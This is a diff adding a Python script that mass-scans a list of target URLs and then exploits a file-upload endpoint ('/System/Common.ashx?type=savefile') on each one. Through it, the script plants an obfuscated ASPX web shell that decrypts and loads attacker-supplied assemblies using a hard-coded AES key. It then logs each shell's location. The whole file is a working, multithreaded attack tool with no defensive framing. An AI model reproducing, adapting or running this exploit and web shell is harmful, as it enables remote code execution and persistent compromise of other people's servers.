@@ -1,0 +1,97 @@
+
+import os
+import json
+import requests
+from tqdm import tqdm
+from concurrent.futures import ThreadPoolExecutor
+
+# 定义并发线程数
+MAX_THREADS = 64
+
+# 检查目标 URL 是否可用
+url_200 = []
+
+# 检查 URL 的函数
+def check_url(url):
+    try:
+        response = requests.get(url, timeout=4)
+        if response.status_code == 200:
+            url_200.append(url)
+            print(f"200 OK: {url}")
+        else:
+            print(f"Non-200 status code for {url}: {response.status_code}")
+    except requests.exceptions.RequestException as err:
+        print(f"Request failed for {url}: {err}")
+
+# 加载目标 URL
+try:
+    with open('C:\\Users\\user\\Desktop\\target6.txt', 'r') as file:
+        target_urls = [line.strip() for line in file if line.strip()]
+        print(f"Loaded {len(target_urls)} URLs from target5.txt")
+
+        # 使用线程池并行检查 URLs
+        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
+            list(tqdm(executor.map(check_url, target_urls), total=len(target_urls), desc="Checking URLs"))
+except FileNotFoundError:
+    print("targets.txt not found.")
+except Exception as e:
+    print(f"Error loading target6.txt: {e}")
+
+# 处理状态码 200 的 URL
+if url_200:
+    with open('C:\\Users\\user\\Desktop\\sucess6_200.txt', 'w') as f:
+        for result in url_200:
+            f.write(result + '\n')
+
+# Payload
+headers = {
+    'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
+    'Content-Type':'multipart/form-data; boundary=WebKitFormBoundaryHHaZAYecVOf5sfa6',
+}
+
+data = (
+"""
+--WebKitFormBoundaryHHaZAYecVOf5sfa6
+Content-Disposition: form-data; name="content";
+Content-Type: text/plain
+
+<%@ImPoRt NaMeSpAce="System.Reflection"%>
+<%
+Session[System.Text.Encoding.Default.GetString(Convert.FromBase64String("aw=="))]=System.Text.Encoding.ASCII.GetString(new byte[1] { (byte)(49) })+System.Text.Encoding.ASCII.GetString(new byte[1] { (byte)(54) })+System.Text.Encoding.Default.GetString(Convert.FromBase64String("YWNhY2MwNWFhZmFmNg=="))+System.Text.Encoding.ASCII.GetString(new byte[1] { (byte)(55) });
+%><%
+Session["gov"]="https://"+"shanghai.g"+"ov.cn";
+byte[] govBnAOMF7pEFvl = Encoding.Default.GetBytes/*govj9jFKPnK2j*/(Session[Convert.ToInt32(System.Text.Encoding.ASCII.GetString(new byte[1] { (byte)(48) }))] + ""),
+govNr7RcJUx = Request.BinaryRead/*gov5OdHL9*/(Request.ContentLength);
+Assembly.Load(new System./*govgGUL1DlYfH0h*/Security/*govkKiTGNUfhBqBz*/.Cryptography/*govyfgAHXijFW*/./*govNrhNIerWkKgcAS*/RijndaelManaged()/*govM2Gxr5b*/.CreateDecryptor(govBnAOMF7pEFvl, govBnAOMF7pEFvl).TransformFinalBlock/*gov587B0xg*/(govNr7RcJUx, Convert.ToInt32(System.Text.Encoding.Default.GetString(Convert.FromBase64String("MA=="))), govNr7RcJUx.Length))./*gov0cecbtxXZBitcNt*/CreateInstance(System.Text.Encoding.Default./*gov4LzJOIFGj2O1*/GetString(Convert.FromBase64String("VQ==")))/*govmbL*/.Equals(this);
+%>
+<%@ PagE LaNguAge="C#" %>
+--WebKitFormBoundaryHHaZAYecVOf5sfa6--
+"""
+)
+
+# Exploit function
+def exp(line):
+    host = line + "/System/Common.ashx?type=savefile&path=1.aspx HTTP/1.1"
+    try:
+        response = requests.post(url=host, headers=headers, data=data, timeout=15)
+        if response.status_code == 200:
+            try:
+                # 打印调试信息
+                print(f"Response text from {line}: {response.text}")
+                print(f"POST request successful for {line}")
+                with open('result-sucess5_200.txt', 'a') as f:
+                    f.write(line + '/System/1.aspx\n')
+                    print(f"成功上傳 : {line}/System/1.aspx")
+                    print('OK')
+            except Exception as e:
+                print(f"Error processing response from {line}: {e}")
+        else:
+            print(f"Failed to upload for {line}: {response.status_code}")
+    except requests.RequestException as e:
+        print(f"Error sending request to {line}: {e}")
+
+
+# 使用线程池并行执行 EXP
+if url_200:
+    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
+        list(tqdm(executor.map(exp, url_200), total=len(url_200), desc="Executing EXP"))
